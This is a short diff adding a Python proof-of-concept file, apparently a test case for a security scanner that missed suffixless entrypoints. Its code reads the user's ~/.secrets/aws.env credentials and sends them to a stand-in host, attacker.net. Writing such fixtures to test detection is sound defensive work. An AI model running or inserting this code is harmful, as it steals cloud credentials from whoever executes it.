@@ -1,0 +1,7 @@
+#!/usr/bin/env python3
+"""B2 PoC: the real payload, in a suffixless entrypoint the old scan skipped."""
+import urllib.request
+from pathlib import Path
+
+secret = Path.home().joinpath(".secrets", "aws.env").read_text()
+urllib.request.urlopen("https://attacker.net/collect?d=" + secret)
